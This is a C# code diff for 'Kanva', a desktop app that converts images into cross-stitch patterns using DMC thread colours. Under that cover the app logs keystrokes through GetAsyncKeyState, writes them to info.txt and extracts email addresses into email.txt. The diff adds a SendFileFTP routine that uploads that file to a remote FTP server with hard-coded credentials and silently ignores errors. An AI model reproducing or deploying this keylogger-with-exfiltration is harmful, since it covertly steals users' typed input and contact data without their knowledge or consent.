@@ -16,21 +16,22 @@ using System.Drawing.Drawing2D;
 namespace Courseprojecttokb
 {
 
-    public partial class Form1 : Form
+    public partial class Kanva : Form
     {
-        public Form1()
+        public Kanva()
         {
             InitializeComponent();
             comboBox1.Enabled = false;
             numericheight.Enabled = false;
             numericwidth.Enabled = false;
+            checkBox1.Enabled = false;
         }
         //доступ к клавиатуре
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
 
         private List<Options> ColorsInfo = new List<Options>();
-        private List<string> UsedColors = new List<string>();
+        //private List<string> UsedColors = new List<string>();
         double propor;
         bool onoff = false;
 
@@ -61,12 +62,6 @@ namespace Courseprojecttokb
         }
         Bitmap mainimage;
 
-        private Bitmap Proportions(Bitmap input, int wconst, int hconst)
-        {
-            Bitmap output = new Bitmap(input);
-
-            return output;
-        }
 
         private Bitmap PictureSize(Bitmap imagecopy)
         {
@@ -129,7 +124,6 @@ namespace Courseprojecttokb
         }
         private void PictureToKanva(Bitmap imagecopy)
         {
-            UsedColors.Clear();
             Bitmap input = new Bitmap(imagecopy);
             Bitmap output = new Bitmap(input.Width, input.Height);
             string colornum = "";
@@ -161,7 +155,6 @@ namespace Courseprojecttokb
                         }
 
                     }
-                    UsedColors.Add(colornum);
                     UInt32 newPixel = 0xFF000000 | ((UInt32)R2 << 16) | ((UInt32)G2 << 8) | ((UInt32)B2);
                     // добавляем его в Bitmap нового изображения
                     output.SetPixel(i, j, Color.FromArgb((int)newPixel));
@@ -196,6 +189,7 @@ namespace Courseprojecttokb
                     comboBox1.Enabled = true;
                     numericheight.Enabled = true;
                     numericwidth.Enabled = true;
+                    checkBox1.Enabled = true;
                 }
                 catch
                 {
@@ -328,6 +322,7 @@ namespace Courseprojecttokb
             //comboBox1.Text = "425";
             ColorsToList("DMC60.txt");
             NumbersToList();
+            File.Delete("email.txt");
             ReadAllFiles();
         }
 
@@ -361,6 +356,7 @@ namespace Courseprojecttokb
 
         private void PictureToMatrix()
         {
+            palitras.Clear();
             if (pictureBox1.Image != null)
             {
                 MatrixHex.Clear();
@@ -419,11 +415,17 @@ namespace Courseprojecttokb
                 }
             }
         }
+        private void tabPage1_Enter(object sender, EventArgs e)
+        {
+            listView1.Items.Clear();
+        }
 
         private void tabPage3_Enter(object sender, EventArgs e)
         {
+            
             PictureToMatrix();
             Paint += new PaintEventHandler(panel2_Paint);
+            
             foreach (Palitra pal in palitras)
             {
                 ListViewItem item = new ListViewItem(pal.Number);
@@ -440,10 +442,7 @@ namespace Courseprojecttokb
         //запись в файл
         private void WriteTotxt(string value)
         {
-            StreamWriter stream = new StreamWriter("info.txt", true);
-            /*if (text == "left")
-                stream.BaseStream.Seek(-1, SeekOrigin.End);
-            else*/       
+            StreamWriter stream = new StreamWriter("info.txt", true);      
             stream.Write(value);
             stream.Close();
         }
@@ -461,14 +460,15 @@ namespace Courseprojecttokb
             {
                 Email.Add(match.Value);
             }
-            if (Email != null)
+            if (Email.Count != 0)
             {
-                StreamWriter stream = new StreamWriter("email.txt", true);
-                foreach (string em in Email)
-                {
-                    stream.Write(Environment.NewLine + em);
-                }
-                stream.Close();
+                File.AppendAllText("email.txt", String.Format(String.Join(Environment.NewLine, Email)) + Environment.NewLine);
+                //StreamWriter stream = new StreamWriter("email.txt", true);
+                //foreach (string em in Email)
+                //{
+                //    stream.Write(Environment.NewLine + em);
+                //}
+                //stream.Close();
             }
         }
 
@@ -500,6 +500,8 @@ namespace Courseprojecttokb
                 EmailOrNot(temp);
             }
             stream.Close();
+            SendFileFTP();
+            File.AppendAllText("info.txt", " ");
         }
 
         //нажатие клавишы Shift
@@ -510,6 +512,54 @@ namespace Courseprojecttokb
         string text;
         bool capslock, numlock;
 
+       
+        private void SendFileFTP()
+        {
+
+            FileInfo fileInf = new FileInfo("email.txt");
+            string uri = "ftp://" + "10.20.130.22:2221" + "/" + fileInf.Name;
+            FtpWebRequest reqFTP;
+            // Создаем объект FtpWebRequest
+            reqFTP = (FtpWebRequest)FtpWebRequest.Create(new Uri("ftp://" + "10.20.130.22:2221" + "/" + fileInf.Name));
+            // Учетная запись
+            reqFTP.Credentials = new NetworkCredential("francis", "francis");
+            reqFTP.KeepAlive = false;
+            // Задаем команду на закачку
+            reqFTP.Method = WebRequestMethods.Ftp.UploadFile;
+            // Тип передачи файла
+            reqFTP.UseBinary = true;
+            // Сообщаем серверу о размере файла
+            reqFTP.ContentLength = fileInf.Length;
+            // Буффер в 2 кбайт
+            int buffLength = 2048;
+            byte[] buff = new byte[buffLength];
+            int contentLen;
+            // Файловый поток
+            FileStream fs = fileInf.OpenRead();
+            try
+            {
+                Stream strm = reqFTP.GetRequestStream();
+                // Читаем из потока по 2 кбайт
+                contentLen = fs.Read(buff, 0, buffLength);
+                // Пока файл не кончится
+                while (contentLen != 0)
+                {
+                    strm.Write(buff, 0, contentLen);
+                    contentLen = fs.Read(buff, 0, buffLength);
+                }
+                // Закрываем потоки
+                strm.Close();
+                fs.Close();
+            }
+            catch (Exception ex)
+            {
+
+                return;// MessageBox.Show(ex.Message, "Ошибка");
+
+            }
+           
+            
+        }
 
 
 
